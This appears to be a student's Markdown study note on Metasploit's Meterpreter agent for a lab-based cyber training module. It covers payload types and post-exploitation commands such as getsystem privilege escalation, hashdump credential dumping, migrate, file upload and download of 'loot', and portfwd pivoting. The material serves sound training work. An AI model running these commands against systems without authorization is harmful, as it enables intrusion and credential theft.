---
tags: [cyber, module1, metasploit]
jqr: "Module 1 — Meterpreter payload/agent: core post-exploitation commands, shell vs meterpreter, staged/stageless, reverse/bind"
---

# Meterpreter

Meterpreter is Metasploit's feature-rich, in-memory post-exploitation **agent** — the payload you usually want after an exploit lands. Once you see `meterpreter >`, this note is your command reference.

> 🧪 **Run this on your lab (Kali 2026.2)** — these commands need a live session against your own VM. No live MSF output in the study sandbox; verified against current docs, confirm on your box.

## TL;DR

```text
sysinfo        # OS, arch, hostname, domain
getuid         # which user am I?
getsystem      # attempt local privesc to NT AUTHORITY\SYSTEM
hashdump       # dump local SAM hashes (needs SYSTEM)
ps ; migrate <pid>          # list processes, move into a better one
shell                       # drop to a native OS shell (cmd.exe / /bin/sh)
upload / download <src> <dst>
portfwd add -l 3389 -p 3389 -r 192.168.1.20   # pivot: local:3389 -> target:3389
background ; sessions -i 1  # park the session, then re-enter it
```

## Concept

Mental model: a plain shell is a walkie-talkie patched straight into the OS command prompt — whatever you type, the OS runs, and anyone sniffing the wire hears every word. Meterpreter is more like a covert remote-admin app slipped into the machine's memory: it talks over an encrypted channel and hands you a whole toolbox of verbs the raw shell never had.

A plain **shell** payload gives you a raw OS command line (cmd.exe or /bin/sh) over a bare TCP socket. **Meterpreter** instead loads a small agent that runs entirely in memory and speaks an encrypted (TLS) protocol back to your handler. That buys you: no agent file on disk, a rich built-in command set (file ops, process control, pivoting, credential/token theft), and a quieter channel — all without spawning noisy extra processes.

You reach a Meterpreter prompt two ways: an exploit sets a meterpreter payload and pops a session (see [Metasploit Workflow](Metasploit%20Workflow.md)), or you build one with [MSFvenom](MSFvenom.md) and catch it with `multi/handler`.

### Shell vs Meterpreter

| | Plain `shell` payload | `meterpreter` payload |
|---|---|---|
| Interface | Raw cmd.exe / /bin/sh | Scriptable agent + `shell` on demand |
| On disk | Often spawns a process | Runs **in memory** |
| Channel | **Cleartext TCP** | **Encrypted (TLS)** |
| Verbs | Only what the OS shell has | file ops, `migrate`, `hashdump`, `portfwd`, `getsystem`... |

Why "encrypted channel" is a real distinction: a plain reverse shell (the kind [Netcat](../../Recon%20Tools/Netcat.md) gives you) is fully readable on the wire. Here is a plain listener on the classic port 4444 with `tcpdump` sniffing the same traffic — the payload data is cleartext:

> ✅ **Tested output** (Ubuntu 24.04, 2026):
> ```
> --- what the listener received ---
> PASSWORD=SuperSecret123 sent over netcat
> --- what tcpdump saw on the wire (note cleartext) ---
> gD'.gD'.PASSWORD=SuperSecret123 sent over netcat
>
> 04:02:18.984271 IP 127.0.0.1.4444 > 127.0.0.1.43044: Flags [.], ack 42, win 64, options [nop,nop,TS val 1732519726 ecr 1732519726], length 0
> ```

→ A defender sniffing this sees the secret in plain text. Meterpreter's TLS channel would show ciphertext instead — that's the "quieter C2" advantage in one picture.

### Staged vs stageless, reverse vs bind

The payload name encodes three choices:

| Dimension | Marker in name | Meaning |
|---|---|---|
| **Shell vs Meterpreter** | `shell/...` vs `meterpreter/...` | raw OS shell vs the in-memory agent |
| **Staged vs stageless** | `/` vs `_` | `meterpreter/reverse_tcp` (**slash = staged**): tiny stub pulls the rest over the network. `meterpreter_reverse_tcp` (**underscore = stageless**): whole payload in one blob |
| **Reverse vs bind** | `reverse_tcp` vs `bind_tcp` | **reverse** = target connects *out* to you (beats inbound firewalls). **bind** = target *listens*, you connect *in* |

→ Examples: `windows/x64/meterpreter/reverse_tcp` = staged, reverse, meterpreter (needs LHOST/LPORT). `windows/x64/meterpreter/bind_tcp` = bind (needs RHOST + LPORT, no LHOST). Staged payloads need a **matching handler** or the second stage never completes.

> **Why staging exists:** the opening an exploit gives you is often tiny — sometimes only room for a few hundred bytes. A *staged* payload squeezes a minimal stub through that hole whose only job is to pull the rest of Meterpreter down the wire from your handler. *Stageless* skips the round trip (one big self-contained blob) — simpler, but too large to fit through many exploits. That download step is exactly why a staged payload stalls without a matching handler: there's no one home to send stage two.

## Core commands

### Situational awareness
```text
sysinfo      # OS, architecture, hostname, domain
getuid       # the account this session runs as
getprivs     # enabled Windows privileges (look for SeImpersonate, SeDebug)
ps           # process list (PID, arch, user) — pick a migration target
```

### Escalate / harvest
```text
getsystem    # attempt local privesc to NT AUTHORITY\SYSTEM
hashdump     # dump local SAM password hashes (needs SYSTEM first)
```
→ `getprivs` showing `SeImpersonatePrivilege` is the classic lead-in to a "Potato" token attack — see [Privilege Escalation Concepts](../../Knowledge%20Req/Privilege%20Escalation%20Concepts.md). `load kiwi` adds Mimikatz-style credential features (lab only).

### Stability
```text
migrate 1234   # move meterpreter into PID 1234 (survive a dying process, match arch, blend in)
```
→ Migrate into a stable, same-architecture process (e.g. `explorer.exe`) early — if the exploited process dies, your session dies with it.

### Interact with the host
```text
shell                             # drop to cmd.exe / /bin/sh (see [Windows CLI and net Commands](../../Win%20Admin/Windows%20CLI%20and%20net%20Commands.md))
upload  linpeas.sh /tmp/linpeas.sh   # push a file to the target
download C:\\loot\\secrets.txt ./    # pull a file back to Kali
```
→ `upload` is how you get an enum script onto the box (see [Enumeration Tools](../../Knowledge%20Req/Enumeration%20Tools.md)); `download` exfiltrates loot back to your lab.

### Pivot
```text
portfwd add -l 3389 -p 3389 -r 192.168.1.20   # local:3389 forwards to target:3389
```
→ Turns your session into a tunnel so tools on Kali reach services only the target can see. This is the Metasploit on-ramp to [Pivoting and Tunneling](../../Knowledge%20Req/Pivoting%20and%20Tunneling.md).

### Session management
```text
background        # park the session (keeps it alive), return to msf prompt
sessions          # list sessions   (sessions -l)
sessions -i 1     # re-enter session 1
```
→ `background` then `sessions -i <id>` is the loop for juggling multiple footholds.

## Exam tips & gotchas

- **`getsystem` and `hashdump` need SYSTEM** — `hashdump` fails as a normal user; escalate first (`getsystem`, or a privesc vector).
- **Migrate early, migrate to matching arch** — a 32-bit meterpreter can't cleanly migrate into a 64-bit process; check `ps` arch column.
- **Staged payload ⇒ matching handler** — mismatch = the session opens then stalls or dies.
- **`shell` gives a dumb terminal** — for a fuller experience upgrade it (Python pty) once inside; meterpreter's own verbs are usually better than dropping to `shell`.
- **`background`, not `exit`** — `exit` from a meterpreter session kills it; `background` keeps the foothold.
- **Reverse beats bind through firewalls** — most labs/CTFs egress-allow outbound, so `reverse_tcp` is the default; use `bind_tcp` only when you can reach a listening port on the target.

## References

- Meterpreter basics (Metasploit Unleashed) — https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
- Metasploit documentation (home) — https://docs.metasploit.com/
- Kali metasploit-framework package — https://www.kali.org/tools/metasploit-framework/

## Related

- [Metasploit Workflow](Metasploit%20Workflow.md)
- [MSFvenom](MSFvenom.md)
- [Netcat](../../Recon%20Tools/Netcat.md)
- [Pivoting and Tunneling](../../Knowledge%20Req/Pivoting%20and%20Tunneling.md)
- [Windows CLI and net Commands](../../Win%20Admin/Windows%20CLI%20and%20net%20Commands.md)
